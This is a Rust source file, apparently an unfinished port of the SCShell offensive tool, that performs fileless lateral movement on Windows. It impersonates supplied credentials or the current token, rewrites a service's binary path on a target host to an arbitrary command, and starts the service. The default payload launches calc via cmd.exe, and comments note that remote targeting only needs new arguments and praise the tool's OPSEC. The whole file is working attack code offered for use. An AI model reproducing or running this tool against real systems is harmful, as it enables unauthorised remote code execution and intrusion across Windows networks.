// SCSHell, Rust Variant
// Refs:
//  - https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/scshell_c_embed_bin.nim,
//  - https://github.com/Mr-Un1k0d3r/SCShell
// Fileless command execution/lateral movement on Windows hosts via rewriting the service execution path to execute cmd.exe, then changes it back
// OPSEC wise, it might not get better than this in some ways

use std::io;
use std::io::{stdin, stdout, Read, Write};
use std::process::exit;
use std::ptr::null_mut;
use windows::core::{PCSTR, PSTR};
use windows::core::Error;

use windows::Win32::{
    Foundation::{CloseHandle, BOOL, HANDLE, GetLastError},
    Security::{
        ImpersonateLoggedOnUser, LogonUserA, LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT, SC_HANDLE, TOKEN_ALL_ACCESS,
    },
    System::{
        Memory::GPTR,
        Services::{
            ChangeServiceConfigA, OpenSCManagerA, OpenServiceA, QueryServiceConfigA,
            QUERY_SERVICE_CONFIGA, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, CloseServiceHandle, GetServiceKeyNameA,SERVICE_NO_CHANGE, SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE, StartServiceA
        },
        Threading::{GetCurrentProcess, OpenProcessToken},
    },
};

fn breakpoint() {
    let mut stdout = stdout();
    stdout.write(b"[*] Press Enter to continue...\n").unwrap();
    stdout.flush().unwrap();
    stdin().read(&mut [0]).unwrap();
}

// proc SCShell(targetHost: cstring, serviceName: cstring, payload: cstring, domain: cstring, username: cstring, password: cstring): int
fn SCShell(
    mut target_host: &str,
    service_name: &str,
    payload: &str,
    domain: &str,
    username: &str,
    password: &str,
) -> bool {
    
    let mut lpqsc: QUERY_SERVICE_CONFIGA;
    let mut lpqsize: u32;
    let mut originalBinaryPath: &str;
    let mut result: bool = false;

    println!("[*] Host: {}", &target_host);
    println!("[*] Service Name: {}", &service_name);
    println!("[*] Payload: {}", &payload);
    println!("[*] Domain: {}", &domain);
    println!("[*] Username: {}", &username);
    println!("[*] Password: {}", &password);

    unsafe {
        let target_host_ptr: PCSTR;

        // If the host is passed in, set the hostname variable to that name
        // Otherwise, the host can be Null and will be localhost implicitely

        if target_host == "local" {
            // target host is set to null
            println!("[+] Running on localhost");
            target_host_ptr = PCSTR(&0u8);
        } else {
            println!("[+] Targeting {}", target_host);
            target_host_ptr = PCSTR(target_host.as_ptr());
        }

        // If a username is provided with password,
        //  bResult = LogonUserA(username, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, &hToken);
        let mut hToken: HANDLE = HANDLE(0);
        if !username.is_empty() {
            println!("[+] Username: {}", username);
            let bResult: BOOL = LogonUserA(
                PCSTR(username.as_ptr()),
                PCSTR(domain.as_ptr()),
                PCSTR(password.as_ptr()),
                LOGON32_LOGON_NEW_CREDENTIALS,
                LOGON32_PROVIDER_DEFAULT,
                &mut hToken,
            );
        } else {
            println!("[*] No username provided, stealing current process token");
            OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_ALL_ACCESS,
              &mut hToken);
        }
       
        println!("[*] Token handle: {:x?}", hToken);
        breakpoint();

        let mut bResult: BOOL = ImpersonateLoggedOnUser(hToken);


        // Using the (made) token to open the SCmanager


        let mut schManager: SC_HANDLE = SC_HANDLE(0);
        let schManager: SC_HANDLE = OpenSCManagerA(
            target_host_ptr,
            PCSTR(SERVICES_ACTIVE_DATABASE.as_ptr()),
            SC_MANAGER_ALL_ACCESS).unwrap();

        if schManager.is_invalid() {
            println!("[-] Could not open service manager handle.");
            exit(1)
        } else{
            println!("[+] Service manager handle: {:?}", schManager);
        }

        breakpoint();

        //let mut schService: SC_HANDLE = SC_HANDLE(0);
        let schService: SC_HANDLE = OpenServiceA(
            schManager,
            PCSTR(service_name.as_ptr()),
            SERVICE_ALL_ACCESS).unwrap();

            if schService.is_invalid() {
                println!("[-] Could not open service handle.");
                let err_msg = GetLastError();
                println!("[-] Error: {:?}", err_msg);
                exit(1)
            } else{
                println!("[+] Service name: {}", &service_name);
                println!(r"    \\\\-- [+] Service handle: {:?}", schManager);
            }

        let mut dwSize: u32 = 0;
        
        QueryServiceConfigA(
            schService,
            null_mut(),
            0,
            &mut dwSize);
       
            // TODO: this changes the service path but need to make sure if null_mut() is the right thing to put here
        let mut bResult: BOOL = ChangeServiceConfigA(
            schService,
            SERVICE_NO_CHANGE,
            SERVICE_DEMAND_START,
            SERVICE_ERROR_IGNORE,
            PCSTR(payload.as_ptr()),
            PCSTR(null_mut()),
            null_mut(),
            PCSTR(null_mut()),
            PCSTR(null_mut()),
            PCSTR(null_mut()),
            PCSTR(null_mut()));

        println!("[*] ChangeServiceConfigA result: {:?}", bResult);
        println!("    \\\\-- [*] {:?}", GetLastError());

        // TODO: the service path is changed, but the service does not start yet!
        let bResult: BOOL = StartServiceA(schService,
            &[PSTR(null_mut())]);

            println!("[*] StartServiceA result: {:?}", bResult);
            println!("    \\\\-- [*] {:?}", GetLastError());    

        // bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);


        // GlobalFree, close handle, close service handle, etc
        //GlobalFree(lpqsc);
        CloseHandle(hToken);
        CloseServiceHandle(schManager);
        CloseServiceHandle(schService);


        false
    }
}

fn main() {
    println!("[!] SCShell!");

    // null terminated strings! We can move this into the inner function eventually so the args can be passed in normal string form
    let res = SCShell(
        "local",
        "XblAuthManager\0",
        "C:\\WINDOWS\\system32\\cmd.exe /C calc.exe\0",
        "", // want to do it remotely? Change me!
        "",
        "",
    );

    println!("[*] Result: {}", res.to_string())
}
